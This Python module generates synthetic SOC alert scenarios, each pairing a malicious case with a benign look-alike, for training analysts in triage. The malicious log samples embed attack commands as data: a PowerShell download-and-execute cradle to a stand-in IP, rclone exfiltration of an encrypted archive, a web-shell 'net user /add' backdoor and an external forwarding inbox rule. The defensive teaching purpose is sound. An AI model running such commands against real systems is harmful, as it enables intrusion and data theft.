"""Synthetic alert scenarios for the SOC simulator.

Each scenario models one detection rule. Every rule has a malicious variant
and a benign look-alike that fires the same rule with the same title,
source, and severity, so the only way to triage correctly is to read the
log and the enrichment, just like a real queue.

All data is fictional. External addresses use the RFC 5737 documentation
ranges (192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24), internal ones use
RFC 1918 space, and every domain ends in the reserved `.example` TLD.
"""
from __future__ import annotations

import base64
import random
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from typing import Callable

USERS = ["jsmith", "mlopez", "kwilliams", "dchen", "apatel", "rjohnson", "tnguyen", "sbrown"]
WORKSTATIONS = ["WS-0142", "WS-0217", "WS-0388", "WS-0451", "WS-0523", "WS-0619"]
SERVERS = ["srv-app-03", "srv-files-02", "srv-web-01", "srv-db-04"]


@dataclass
class AlertSpec:
    scenario: str
    source: str
    severity: str
    title: str
    technique: str
    raw_log: str
    enrichment: dict
    true_disposition: str
    indicators: list[str]
    explanation: str
    response: list[str] = field(default_factory=list)


def _ext_ip(rng: random.Random) -> str:
    return f"{rng.choice(['192.0.2', '198.51.100', '203.0.113'])}.{rng.randint(2, 254)}"


def _int_ip(rng: random.Random, net: str = "10.20") -> str:
    return f"{net}.{rng.randint(1, 30)}.{rng.randint(2, 254)}"


def _ts(dt: datetime) -> str:
    return dt.strftime("%Y-%m-%dT%H:%M:%SZ")


def _syslog_ts(dt: datetime) -> str:
    return dt.strftime("%b %d %H:%M:%S")


# ----------------------------------------------------------------------------
# 1. Multiple failed logons followed by success  (T1110.001 Password Guessing)
# ----------------------------------------------------------------------------


def auth_bruteforce(rng: random.Random, day: datetime, malicious: bool) -> AlertSpec:
    host = "srv-jump-01"
    user = rng.choice(USERS)
    pid = rng.randint(1000, 9999)
    lines: list[str] = []
    if malicious:
        start = day.replace(hour=rng.randint(1, 4), minute=rng.randint(0, 59))
        src = _ext_ip(rng)
        tried = ["admin", "root", "test", "oracle", user]
        fails = rng.randint(45, 90)
        for i in range(6):
            name = tried[i % len(tried)]
            prefix = "invalid user " if name != user else ""
            t = start + timedelta(seconds=i * 3)
            lines.append(
                f"{_syslog_ts(t)} {host} sshd[{pid + i}]: Failed password for {prefix}{name} "
                f"from {src} port {rng.randint(30000, 65000)} ssh2"
            )
        lines.append(f"... ({fails - 6} more similar lines over {rng.randint(3, 5)} minutes)")
        t = start + timedelta(minutes=5)
        lines.append(f"{_syslog_ts(t)} {host} sshd[{pid + 99}]: Accepted password for {user} from {src} port 51022 ssh2")
        lines.append(f"{_syslog_ts(t + timedelta(seconds=40))} {host} sudo: {user} : TTY=pts/1 ; PWD=/home/{user} ; USER=root ; COMMAND=/usr/bin/sudo -l")
        enrichment = {
            "Source IP": f"{src} (hosting provider, no prior history in this environment)",
            "Threat intel": f"{src} reported in 14 abuse reports for SSH scanning (simulated)",
            "User baseline": f"{user} normally connects from the VPN pool 10.8.0.0/16 between 0700-1700",
            "Failed attempts": str(fails),
        }
        return AlertSpec(
            "auth_bruteforce", "auth", "high",
            "Multiple failed logons followed by success", "T1110.001",
            "\n".join(lines), enrichment, "malicious",
            [
                "Dozens of failures in minutes from one external IP",
                "Several usernames tried (admin, root, test): guessing, not a typo",
                "Success for a real account from the same IP right after the failures",
                "Immediate privilege enumeration (sudo -l) after login",
                "Off-hours and outside the user's normal source network",
            ],
            "This is a password-guessing attack that worked. A real user mistyping a password "
            "fails a few times on one username. Here an external host cycled through common "
            "account names, then got in as a real user and immediately checked its sudo rights. "
            "Treat the account as compromised.",
            [
                "Disable or force-reset the compromised account and kill its active sessions",
                "Block the source IP at the perimeter",
                "Review what the session did after login (bash history, sudo logs, new files)",
                "Fix the root cause: no password SSH from the internet, require keys plus MFA",
            ],
        )

    start = day.replace(hour=rng.randint(7, 9), minute=rng.randint(0, 59))
    src = _int_ip(rng, "10.8")
    for i in range(3):
        t = start + timedelta(seconds=i * 9)
        lines.append(f"{_syslog_ts(t)} {host} sshd[{pid + i}]: Failed password for {user} from {src} port {rng.randint(30000, 65000)} ssh2")
    t = start + timedelta(seconds=40)
    lines.append(f"{_syslog_ts(t)} {host} sshd[{pid + 9}]: Accepted password for {user} from {src} port 50112 ssh2")
    ticket = f"HD-{rng.randint(10000, 99999)}"
    enrichment = {
        "Source IP": f"{src} (corporate VPN pool, assigned to {user})",
        "Threat intel": "No matches",
        "User baseline": f"{user} normally connects from the VPN pool 10.8.0.0/16 between 0700-1700",
        "Recent change": f"Password reset for {user} completed yesterday ({ticket})",
        "Failed attempts": "3",
    }
    return AlertSpec(
        "auth_bruteforce", "auth", "high",
        "Multiple failed logons followed by success", "T1110.001",
        "\n".join(lines), enrichment, "benign",
        [
            "Only 3 failures, all for the same valid username",
            "Source is the user's own VPN address",
            "A password reset yesterday explains the typos",
            "Business hours, matches the user's baseline",
        ],
        "This is a person who changed their password yesterday and fumbled it this morning. "
        "Same username every time, their usual source network, normal hours, and a helpdesk "
        "ticket that explains it. Close it, and consider tuning the rule threshold.",
        ["Close as benign", "Consider raising the failure threshold or excluding the VPN pool for low counts"],
    )


# ----------------------------------------------------------------------------
# 2. Periodic outbound connections  (T1071.001 Application Layer Protocol: Web)
# ----------------------------------------------------------------------------


def beaconing(rng: random.Random, day: datetime, malicious: bool) -> AlertSpec:
    ws = rng.choice(WORKSTATIONS)
    src = _int_ip(rng)
    start = day.replace(hour=rng.randint(0, 23), minute=rng.randint(0, 50))
    lines = []
    if malicious:
        domain = rng.choice(["cdn-update-sync.example", "static-img-cache.example", "api-metrics-hub.example"])
        interval = 60
        for i in range(6):
            jitter = rng.randint(-2, 2)
            t = start + timedelta(seconds=i * interval + jitter)
            lines.append(
                f"{t:%Y-%m-%d %H:%M:%S} {src} CONNECT {domain}:443 200 bytes_out={rng.randint(405, 420)} "
                f"bytes_in={rng.randint(1120, 1150)} proc=rundll32.exe ua=\"Mozilla/4.0 (compatible; MSIE 7.0)\""
            )
        lines.append(f"... ({rng.randint(300, 600)} more connections, same pattern)")
        enrichment = {
            "Host": f"{ws} ({src}), user workstation",
            "Destination": f"{domain}: domain registered 3 days ago, category: Uncategorized",
            "Fleet prevalence": "1 of 412 hosts has contacted this domain",
            "Process": "rundll32.exe (Windows system binary, unsigned DLL argument)",
            "Interval": "60s with +/- 2s jitter",
        }
        return AlertSpec(
            "beaconing", "proxy", "high",
            "Periodic outbound connections (possible C2 beacon)", "T1071.001",
            "\n".join(lines), enrichment, "malicious",
            [
                "Machine-regular 60s interval with almost no jitter",
                "Brand new, uncategorized domain",
                "Only one host in the whole fleet talks to it",
                "rundll32.exe making web requests with an ancient user agent",
                "Tiny, uniform request and response sizes (check-in traffic)",
            ],
            "That's what command-and-control check-ins look like: a host calling home on a timer "
            "with small fixed-size messages. Prevalence is the big tell. Legit software talks to "
            "its vendor from many hosts. One host talking to a 3-day-old domain through rundll32 "
            "is an implant.",
            [
                "Isolate the host with EDR",
                "Block the domain and resolve it to find related infrastructure",
                "Pull the rundll32 command line and the DLL it loaded for analysis",
                "Hunt for the same domain or DLL hash on other hosts",
            ],
        )

    domain = "telemetry.vendor-av.example"
    interval = 300
    for i in range(6):
        t = start + timedelta(seconds=i * interval + rng.randint(-1, 1))
        lines.append(
            f"{t:%Y-%m-%d %H:%M:%S} {src} CONNECT {domain}:443 200 bytes_out={rng.randint(600, 640)} "
            f"bytes_in={rng.randint(300, 320)} proc=AVAgent.exe ua=\"VendorAV-Agent/12.4\""
        )
    lines.append(f"... ({rng.randint(100, 200)} more connections, same pattern)")
    enrichment = {
        "Host": f"{ws} ({src}), user workstation",
        "Destination": f"{domain}: registered 2011, category: Security/Software Updates",
        "Fleet prevalence": "409 of 412 hosts contact this domain on the same schedule",
        "Process": "AVAgent.exe, signed by the AV vendor, in software inventory",
        "Allowlist": f"{domain} is on the corporate proxy allowlist",
    }
    return AlertSpec(
        "beaconing", "proxy", "high",
        "Periodic outbound connections (possible C2 beacon)", "T1071.001",
        "\n".join(lines), enrichment, "benign",
        [
            "Signed, inventoried antivirus agent is the process",
            "Destination is a long-lived vendor domain on the allowlist",
            "Nearly every host in the fleet does the same thing",
        ],
        "Lots of legit software beacons: AV, EDR, update agents. Regular timing alone isn't "
        "malicious. Signed vendor process, old categorized domain, allowlisted, and fleet-wide "
        "prevalence make this expected behavior. Close and tune the rule to exclude it.",
        ["Close as benign", "Add a tuning exclusion for the signed agent and allowlisted domain"],
    )


# ----------------------------------------------------------------------------
# 3. Suspicious PowerShell command line  (T1059.001 PowerShell)
# ----------------------------------------------------------------------------


def _ps_enc(cmd: str) -> str:
    return base64.b64encode(cmd.encode("utf-16-le")).decode()


def powershell_encoded(rng: random.Random, day: datetime, malicious: bool) -> AlertSpec:
    ws = rng.choice(WORKSTATIONS)
    user = rng.choice(USERS)
    t = day.replace(hour=rng.randint(8, 17), minute=rng.randint(0, 59), second=rng.randint(0, 59))
    if malicious:
        ip = _ext_ip(rng)
        decoded = f"IEX (New-Object Net.WebClient).DownloadString('http://{ip}/a.ps1')"
        blob = _ps_enc(decoded)
        raw = (
            f"{_ts(t)} EDR ProcessCreate host={ws} user=CORP\\{user}\n"
            f"  parent: C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE "
            f"\"C:\\Users\\{user}\\Downloads\\Invoice_{rng.randint(1000, 9999)}.docm\"\n"
            f"  image:  C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n"
            f"  cmdline: powershell.exe -nop -w hidden -enc {blob}\n"
            f"{_ts(t + timedelta(seconds=2))} EDR NetworkConnect host={ws} image=powershell.exe dst={ip}:80"
        )
        enrichment = {
            "Host": f"{ws}, user workstation ({user}, Accounting)",
            "Parent process": "WINWORD.EXE opening a macro-enabled .docm from Downloads",
            "Hint": "Decode the -enc blob yourself: base64, then UTF-16LE. Python: base64.b64decode(s).decode('utf-16-le')",
            "Destination": f"{ip}: raw IP, no DNS name, no prior connections from the fleet",
        }
        return AlertSpec(
            "powershell_encoded", "edr", "high",
            "Suspicious PowerShell command line", "T1059.001",
            raw, enrichment, "malicious",
            [
                "Word spawning PowerShell (Office should not launch shells)",
                "-nop -w hidden -enc: no profile, hidden window, encoded command",
                f"Decoded: {decoded}  (download and run a remote script in memory)",
                "Outbound connection to a raw IP right after",
                "Macro-enabled document from the Downloads folder",
            ],
            "Classic macro-based initial access. A user opened a malicious .docm, the macro "
            "launched hidden PowerShell, and PowerShell pulled a second-stage script into memory. "
            "Decoding the -enc blob is a core CySA+ skill: once decoded, the IEX + DownloadString "
            "cradle removes all doubt.",
            [
                "Isolate the host",
                "Grab the .docm and the downloaded script for analysis; record hashes",
                "Block the IP, search the proxy/EDR for other hosts contacting it",
                "Find the delivery email and purge it from other mailboxes",
                "Reset the user's credentials in case the stage-two harvested them",
            ],
        )

    script = r"C:\Windows\CCM\SystemTemp\HardwareInventory.ps1"
    ticket = f"CHG-{rng.randint(1000, 9999)}"
    raw = (
        f"{_ts(t)} EDR ProcessCreate host={ws} user=NT AUTHORITY\\SYSTEM\n"
        f"  parent: C:\\Windows\\CCM\\CcmExec.exe\n"
        f"  image:  C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n"
        f"  cmdline: powershell.exe -NoProfile -ExecutionPolicy Bypass -File \"{script}\""
    )
    enrichment = {
        "Host": f"{ws}, user workstation",
        "Parent process": "CcmExec.exe (Microsoft Configuration Manager agent, signed)",
        "Script": f"{script}: Authenticode-signed by CORP IT Code Signing",
        "Fleet prevalence": "Same command ran on 398 hosts within 20 minutes",
        "Change record": f"{ticket}: quarterly hardware inventory, approved",
    }
    return AlertSpec(
        "powershell_encoded", "edr", "high",
        "Suspicious PowerShell command line", "T1059.001",
        raw, enrichment, "benign",
        [
            "Parent is the managed SCCM/ConfigMgr agent running as SYSTEM",
            "Script is signed by internal IT and lives in the CCM temp path",
            "Fleet-wide execution matching an approved change",
            "No network connection to unknown hosts, no encoded command",
        ],
        "ExecutionPolicy Bypass trips the rule, but admins use it constantly. The parent process, "
        "the signed script, fleet prevalence, and the change ticket all point to IT management "
        "tooling. Close and tune for this parent and signer.",
        ["Close as benign", "Exclude CcmExec.exe running IT-signed scripts from this rule"],
    )


# ----------------------------------------------------------------------------
# 4. Internal host port sweep  (T1046 Network Service Discovery)
# ----------------------------------------------------------------------------


def internal_scan(rng: random.Random, day: datetime, malicious: bool) -> AlertSpec:
    start = day.replace(hour=rng.randint(1, 3), minute=rng.randint(0, 59))
    lines = []
    if malicious:
        ws = rng.choice(WORKSTATIONS)
        src = _int_ip(rng)
        ports = [445, 3389, 22, 5985]
        for i in range(8):
            t = start + timedelta(milliseconds=i * 350)
            dst = f"10.20.{rng.randint(1, 30)}.{rng.randint(2, 254)}"
            state = rng.choice(["REJ", "S0", "S0", "SF"])
            lines.append(f"{t.timestamp():.6f}\tC{rng.randint(10**8, 10**9)}\t{src}\t{rng.randint(49152, 65535)}\t{dst}\t{rng.choice(ports)}\ttcp\t-\t{state}")
        lines.append(f"... (2,310 connections to 254 hosts in 88 seconds)")
        header = "#fields ts uid id.orig_h id.orig_p id.resp_h id.resp_p proto service conn_state"
        enrichment = {
            "Source": f"{ws} ({src}), Finance department workstation",
            "Authorized scanners": "10.0.5.10 (vulnscan-01) only",
            "Ports targeted": "445 (SMB), 3389 (RDP), 22 (SSH), 5985 (WinRM)",
            "Change calendar": "No scan or maintenance scheduled",
            "Logged-on user": "none (screen locked since 18:02)",
        }
        return AlertSpec(
            "internal_scan", "ids", "medium",
            "Internal host port sweep", "T1046",
            header + "\n" + "\n".join(lines), enrichment, "malicious",
            [
                "A finance workstation is scanning, and it isn't an authorized scanner",
                "Ports chosen are remote-access and lateral-movement services",
                "Mostly rejected/no-answer states: probing, not normal app traffic",
                "No logged-on user and no change ticket",
            ],
            "Workstations don't sweep subnets. Something on this host is hunting for SMB, RDP, "
            "SSH and WinRM to move laterally, with nobody at the keyboard. That's post-compromise "
            "discovery. The host is already owned; find out how.",
            [
                "Isolate the workstation",
                "Identify the process that opened the connections (EDR network telemetry)",
                "Check the hosts that answered on 445/3389 for follow-on logons from this source",
                "Work backward to the initial access vector",
            ],
        )

    src = "10.0.5.10"
    ticket = f"CHG-{rng.randint(1000, 9999)}"
    for i in range(8):
        t = start + timedelta(milliseconds=i * 120)
        dst = f"10.20.{rng.randint(1, 30)}.{rng.randint(2, 254)}"
        lines.append(f"{t.timestamp():.6f}\tC{rng.randint(10**8, 10**9)}\t{src}\t{rng.randint(49152, 65535)}\t{dst}\t{rng.choice([22, 80, 443, 445, 3389, 8080])}\ttcp\t-\t{rng.choice(['REJ', 'S0', 'SF'])}")
    lines.append("... (41,880 connections to 254 hosts in 14 minutes)")
    header = "#fields ts uid id.orig_h id.orig_p id.resp_h id.resp_p proto service conn_state"
    enrichment = {
        "Source": f"{src} (vulnscan-01), vulnerability scanner",
        "Authorized scanners": "10.0.5.10 (vulnscan-01) only",
        "Ports targeted": "Full TCP range, top ports first",
        "Change calendar": f"{ticket}: weekly authenticated vuln scan, 0100-0400",
        "Logged-on user": "svc_nessus (scanner service account)",
    }
    return AlertSpec(
        "internal_scan", "ids", "medium",
        "Internal host port sweep", "T1046",
        header + "\n" + "\n".join(lines), enrichment, "benign",
        [
            "Source is the one authorized vulnerability scanner",
            "Inside the approved weekly scan window",
            "Change ticket documents it",
        ],
        "This is the vuln scanner doing its job during its window. The detection is correct "
        "(it is a port sweep) but the activity is authorized. Close, and suppress alerts from the "
        "scanner during approved windows so real sweeps stand out.",
        ["Close as benign", "Suppress this rule for vulnscan-01 during the approved window"],
    )


# ----------------------------------------------------------------------------
# 5. User clicked URL in external email  (T1566.002 Spearphishing Link)
# ----------------------------------------------------------------------------


def phishing_click(rng: random.Random, day: datetime, malicious: bool) -> AlertSpec:
    user = rng.choice(USERS)
    ws = rng.choice(WORKSTATIONS)
    t = day.replace(hour=rng.randint(8, 16), minute=rng.randint(0, 59), second=rng.randint(0, 59))
    if malicious:
        domain = rng.choice(["micros0ft-login.example", "rnicrosoft-auth.example", "office365-verify.example"])
        raw = (
            f"[email] {_ts(t)} to={user}@corp.example from=\"IT Support\" <it-support@{domain}>\n"
            f"  subject=\"ACTION REQUIRED: Your password expires today\"\n"
            f"  spf=fail dkim=none dmarc=fail return-path=bounce@{domain}\n"
            f"[proxy] {_ts(t + timedelta(minutes=3))} {ws} GET https://{domain}/owa/auth/logon.aspx 200\n"
            f"[proxy] {_ts(t + timedelta(minutes=4))} {ws} POST https://{domain}/owa/auth/owaauth.dll 302 bytes_out=1844"
        )
        enrichment = {
            "Sender domain": f"{domain}: registered 1 day ago",
            "Real company domain": "corp.example (SSO at login.corp.example)",
            "Email auth": "SPF fail, DKIM none, DMARC fail",
            "Other recipients": f"{rng.randint(12, 40)} users received the same message",
        }
        return AlertSpec(
            "phishing_click", "email", "high",
            "User clicked URL from external email and submitted a form", "T1566.002",
            raw, enrichment, "malicious",
            [
                "Lookalike domain imitating a login page",
                "SPF/DMARC fail: the sender isn't who it claims",
                "Urgency lure (password expires today)",
                "POST to the fake login page: credentials were likely submitted",
                "Domain is one day old and the campaign hit many users",
            ],
            "Credential phishing, and the POST means the user probably typed their password into "
            "the fake page. Treat the account as compromised now, not after confirmation, and scope "
            "the campaign since dozens of people got the same email.",
            [
                "Reset the user's password and revoke active sessions/tokens",
                "Check sign-in logs for that account from new IPs since the click",
                "Purge the email from every mailbox, block the sender domain and URL",
                "Identify every other user who clicked",
            ],
        )

    domain = "benefits.payroll-vendor.example"
    raw = (
        f"[email] {_ts(t)} to={user}@corp.example from=\"Benefits Enrollment\" <noreply@{domain}>\n"
        f"  subject=\"Open enrollment is now available\"\n"
        f"  spf=pass dkim=pass dmarc=pass return-path=bounces@{domain}\n"
        f"[proxy] {_ts(t + timedelta(minutes=3))} {ws} GET https://{domain}/enroll 200\n"
        f"[proxy] {_ts(t + timedelta(minutes=4))} {ws} POST https://login.corp.example/saml/sso 302 bytes_out=2210"
    )
    enrichment = {
        "Sender domain": f"{domain}: registered 2009, approved HR vendor",
        "Real company domain": "corp.example (SSO at login.corp.example)",
        "Email auth": "SPF pass, DKIM pass, DMARC pass",
        "Context": "HR announced open enrollment via the vendor in an all-hands email yesterday",
        "Other recipients": "All employees",
    }
    return AlertSpec(
        "phishing_click", "email", "high",
        "User clicked URL from external email and submitted a form", "T1566.002",
        raw, enrichment, "benign",
        [
            "SPF, DKIM and DMARC all pass for a long-established vendor domain",
            "The POST goes to the company's own SSO, not the external site",
            "HR pre-announced this exact email",
        ],
        "The rule fires on any external link followed by a form submit. Here the credentials "
        "went to the company's real SSO (SAML) and the sender is an authenticated, approved "
        "vendor that HR told everyone to expect. Close it.",
        ["Close as benign", "Add the approved vendor + SSO flow to the rule's allowlist"],
    )


# ----------------------------------------------------------------------------
# 6. Impossible travel sign-in  (T1078 Valid Accounts)
# ----------------------------------------------------------------------------


def impossible_travel(rng: random.Random, day: datetime, malicious: bool) -> AlertSpec:
    user = rng.choice(USERS)
    t1 = day.replace(hour=rng.randint(9, 15), minute=rng.randint(0, 40), second=rng.randint(0, 59))
    t2 = t1 + timedelta(minutes=rng.randint(12, 25))
    ip1 = _ext_ip(rng)
    ip2 = _ext_ip(rng)
    if malicious:
        raw = (
            f"{_ts(t1)} signin user={user}@corp.example ip={ip1} loc=\"Norfolk, US\" app=\"Office 365 Exchange Online\" "
            f"client=Browser device=WS-managed-{rng.randint(100, 999)} mfa=satisfied result=success\n"
            f"{_ts(t2)} signin user={user}@corp.example ip={ip2} loc=\"Lagos, NG\" app=\"Office 365 Exchange Online\" "
            f"client=IMAP4 device=unknown mfa=not_required(legacy_auth) result=success\n"
            f"{_ts(t2 + timedelta(minutes=6))} audit user={user}@corp.example op=New-InboxRule "
            f"name=\".\" forwardTo=archive.{rng.randint(10, 99)}@mailbox-free.example deleteMessage=true"
        )
        enrichment = {
            "Distance / time": f"~9,000 km in {int((t2 - t1).total_seconds() // 60)} minutes",
            "Second IP": f"{ip2}: residential proxy network, not corporate",
            "Client": "IMAP4 legacy auth, which skips MFA",
            "Travel status": "No travel request on file",
        }
        return AlertSpec(
            "impossible_travel", "identity", "high",
            "Impossible travel sign-in", "T1078",
            raw, enrichment, "malicious",
            [
                "Physically impossible distance between sign-ins",
                "Second sign-in used legacy IMAP to dodge MFA, from an unknown device",
                "Inbox rule created right after: forward externally and delete (classic BEC)",
                "Rule named '.' to stay hidden",
            ],
            "The attacker has the user's password and used a legacy protocol that doesn't enforce "
            "MFA. The hidden forward-and-delete inbox rule is the giveaway for business email "
            "compromise: they're quietly reading mail to set up payment fraud.",
            [
                "Revoke sessions and reset the password",
                "Remove the inbox rule and check for other mailbox persistence",
                "Block legacy authentication tenant-wide",
                "Review what mail was forwarded and warn finance about fraudulent payment requests",
            ],
        )

    raw = (
        f"{_ts(t1)} signin user={user}@corp.example ip={ip1} loc=\"Norfolk, US\" app=\"Office 365 Exchange Online\" "
        f"client=Browser device=WS-managed-311 mfa=satisfied result=success\n"
        f"{_ts(t2)} signin user={user}@corp.example ip={ip2} loc=\"Frankfurt, DE\" app=\"Office 365 Exchange Online\" "
        f"client=Browser device=WS-managed-311 mfa=satisfied result=success"
    )
    enrichment = {
        "Distance / time": f"~6,700 km in {int((t2 - t1).total_seconds() // 60)} minutes",
        "Second IP": f"{ip2}: CORP VPN egress (Frankfurt point of presence)",
        "Client": "Same managed device ID on both sign-ins, MFA satisfied on both",
        "Travel status": "No travel; VPN client auto-selected the Frankfurt gateway",
    }
    return AlertSpec(
        "impossible_travel", "identity", "high",
        "Impossible travel sign-in", "T1078",
        raw, enrichment, "benign",
        [
            "Second IP is the company's own VPN egress",
            "Same managed device both times",
            "MFA satisfied on both sign-ins",
        ],
        "Impossible-travel rules trip on VPN egress all the time. Same device, MFA on both, and "
        "the 'foreign' IP is the corporate VPN gateway. The user just connected to the VPN. "
        "Close it and add VPN egress ranges to the rule's known-locations list.",
        ["Close as benign", "Tag VPN egress IPs as trusted locations in the identity provider"],
    )


# ----------------------------------------------------------------------------
# 7. Large outbound transfer  (T1567.002 Exfiltration to Cloud Storage)
# ----------------------------------------------------------------------------


def data_exfil(rng: random.Random, day: datetime, malicious: bool) -> AlertSpec:
    t = day.replace(hour=rng.randint(2, 4), minute=rng.randint(0, 59))
    if malicious:
        host = "srv-files-02"
        gb = round(rng.uniform(14, 26), 1)
        raw = (
            f"{_ts(t - timedelta(minutes=40))} EDR ProcessCreate host={host} user=CORP\\svc_print "
            f"cmdline=\"C:\\ProgramData\\7z.exe a -p -mhe=on C:\\ProgramData\\b.7z D:\\Shares\\Finance\\*\"\n"
            f"{_ts(t)} EDR ProcessCreate host={host} user=CORP\\svc_print "
            f"cmdline=\"C:\\ProgramData\\rclone.exe copy C:\\ProgramData\\b.7z remote:drop --transfers 8\"\n"
            f"{_ts(t + timedelta(minutes=55))} FW allow src=10.10.2.15 dst=files.anon-share.example:443 "
            f"bytes_out={int(gb * 1024**3)} duration=3300s app=ssl"
        )
        enrichment = {
            "Host": f"{host}, Finance file server",
            "Account": "svc_print: print-spooler service account, should never run interactive tools",
            "Destination": "files.anon-share.example: anonymous file sharing, not sanctioned",
            "Baseline": "Host's normal nightly egress is < 50 MB",
            "Volume": f"{gb} GB",
        }
        return AlertSpec(
            "data_exfil", "firewall", "critical",
            "Large outbound transfer to cloud storage", "T1567.002",
            raw, enrichment, "malicious",
            [
                "Finance share compressed into an encrypted archive (7z -p -mhe=on)",
                "rclone, a common exfiltration tool, dropped in ProgramData",
                "Unsanctioned anonymous file-sharing destination",
                "A print service account doing it: wrong account for the job",
                "Hundreds of times the host's normal egress, at 3 a.m.",
            ],
            "Staging then exfiltration: archive the data with header encryption so DLP can't read "
            "filenames, then push it out with rclone. This is often the step right before ransomware "
            "goes off (double extortion). It's critical: move fast.",
            [
                "Block the destination and isolate the file server",
                "Disable svc_print and find how it was compromised",
                "Determine exactly what was archived for breach notification",
                "Escalate as a potential data breach: legal and leadership get notified",
                "Hunt for ransomware precursors on other servers",
            ],
        )

    host = "srv-backup-01"
    gb = round(rng.uniform(20, 24), 1)
    raw = (
        f"{_ts(t.replace(hour=2, minute=0))} EDR ProcessCreate host={host} user=CORP\\svc_backup "
        f"cmdline=\"C:\\Program Files\\BackupVendor\\BackupAgent.exe --job nightly-offsite\"\n"
        f"{_ts(t.replace(hour=3, minute=48))} FW allow src=10.10.9.4 dst=backup.sanctioned-vendor.example:443 "
        f"bytes_out={int(gb * 1024**3)} duration=6480s app=ssl"
    )
    enrichment = {
        "Host": f"{host}, backup server",
        "Account": "svc_backup: backup service account",
        "Destination": "backup.sanctioned-vendor.example: contracted offsite backup provider",
        "Baseline": "30-day average 21.8 GB nightly, starting 0200",
        "Volume": f"{gb} GB",
    }
    return AlertSpec(
        "data_exfil", "firewall", "critical",
        "Large outbound transfer to cloud storage", "T1567.002",
        raw, enrichment, "benign",
        [
            "Backup server running the vendor's signed backup agent",
            "Destination is the contracted backup provider",
            "Volume and time match the 30-day baseline",
        ],
        "Big nightly uploads from a backup server to the backup vendor is the job. Volume matches "
        "baseline, right account, right process, sanctioned destination. Close it.",
        ["Close as benign", "Baseline-aware threshold for srv-backup-01 to the sanctioned vendor"],
    )


# ----------------------------------------------------------------------------
# 8. Local admin account created  (T1136.001 Create Account: Local Account)
# ----------------------------------------------------------------------------


def new_admin_account(rng: random.Random, day: datetime, malicious: bool) -> AlertSpec:
    host = rng.choice(["srv-app-03", "srv-web-01"])
    if malicious:
        t = day.replace(hour=rng.randint(1, 4), minute=rng.randint(0, 59))
        name = rng.choice(["svc_backup1", "adm1n", "helpdesk$"])
        raw = (
            f"{_ts(t)} {host} Security 4688 New Process: C:\\Windows\\System32\\cmd.exe "
            f"Creator: c:\\windows\\system32\\inetsrv\\w3wp.exe Account: IIS APPPOOL\\DefaultAppPool\n"
            f"{_ts(t)} {host} Security 4688 New Process: C:\\Windows\\System32\\net.exe "
            f"CommandLine: net user {name} P@ss**** /add\n"
            f"{_ts(t + timedelta(seconds=1))} {host} Security 4720 A user account was created. "
            f"New Account: {name} Subject: IIS APPPOOL\\DefaultAppPool\n"
            f"{_ts(t + timedelta(seconds=3))} {host} Security 4732 A member was added to a security-enabled "
            f"local group. Member: {name} Group: Administrators"
        )
        enrichment = {
            "Host": f"{host}, internet-facing IIS web server",
            "Creator": "IIS APPPOOL\\DefaultAppPool (the web application's identity)",
            "Process chain": "w3wp.exe -> cmd.exe -> net.exe",
            "Ticket": "None found",
        }
        return AlertSpec(
            "new_admin_account", "edr", "high",
            "Local administrator account created", "T1136.001",
            raw, enrichment, "malicious",
            [
                "The IIS worker process (w3wp.exe) spawned cmd.exe: a web shell",
                "Account created by the web app's identity, not an admin",
                "Name chosen to blend in with service accounts",
                "Off-hours, no ticket, added straight to Administrators",
            ],
            "A web server process should never spawn a shell. w3wp.exe -> cmd.exe -> net user /add "
            "means someone is running commands through the web app, almost certainly a web shell, "
            "and is creating a backdoor admin account for persistence.",
            [
                "Isolate the web server",
                "Remove the account and look for the web shell in the site's directories",
                "Review IIS logs for the requests that triggered the commands",
                "Patch the vulnerability that allowed the upload or execution",
            ],
        )

    t = day.replace(hour=rng.randint(9, 16), minute=rng.randint(0, 59))
    ticket = f"HD-{rng.randint(10000, 99999)}"
    raw = (
        f"{_ts(t)} {host} Security 4688 New Process: C:\\Windows\\System32\\mmc.exe "
        f"Creator: C:\\Windows\\explorer.exe Account: CORP\\it-admin-rjones\n"
        f"{_ts(t + timedelta(minutes=1))} {host} Security 4720 A user account was created. "
        f"New Account: vendor_maint Subject: CORP\\it-admin-rjones\n"
        f"{_ts(t + timedelta(minutes=1, seconds=20))} {host} Security 4732 A member was added to a security-enabled "
        f"local group. Member: vendor_maint Group: Administrators\n"
        f"{_ts(t + timedelta(minutes=2))} {host} Security 4738 A user account was changed. "
        f"Account: vendor_maint Account Expires: {(t + timedelta(days=1)):%m/%d/%Y}"
    )
    enrichment = {
        "Host": f"{host}, application server",
        "Creator": "CORP\\it-admin-rjones (member of Server Admins)",
        "Process chain": "explorer.exe -> mmc.exe (Computer Management)",
        "Ticket": f"{ticket}: temporary local admin for vendor maintenance, approved by app owner",
    }
    return AlertSpec(
        "new_admin_account", "edr", "high",
        "Local administrator account created", "T1136.001",
        raw, enrichment, "benign",
        [
            "Created interactively by a named server admin through Computer Management",
            "Approved ticket documents exactly this account",
            "Account set to expire in 24 hours",
        ],
        "A real admin, the normal GUI tool, business hours, a matching approved ticket, and a "
        "built-in expiry. This is change management working. Close it, and verify tomorrow that "
        "the account actually expired.",
        ["Close as benign", "Follow up after expiry to confirm vendor_maint is disabled"],
    )


SCENARIOS: dict[str, Callable[[random.Random, datetime, bool], AlertSpec]] = {
    "auth_bruteforce": auth_bruteforce,
    "beaconing": beaconing,
    "powershell_encoded": powershell_encoded,
    "internal_scan": internal_scan,
    "phishing_click": phishing_click,
    "impossible_travel": impossible_travel,
    "data_exfil": data_exfil,
    "new_admin_account": new_admin_account,
}

SCENARIO_LABELS = {
    "auth_bruteforce": "Failed logons then success",
    "beaconing": "Periodic outbound (beacon)",
    "powershell_encoded": "Suspicious PowerShell",
    "internal_scan": "Internal port sweep",
    "phishing_click": "Phishing click",
    "impossible_travel": "Impossible travel",
    "data_exfil": "Large outbound transfer",
    "new_admin_account": "Local admin created",
}
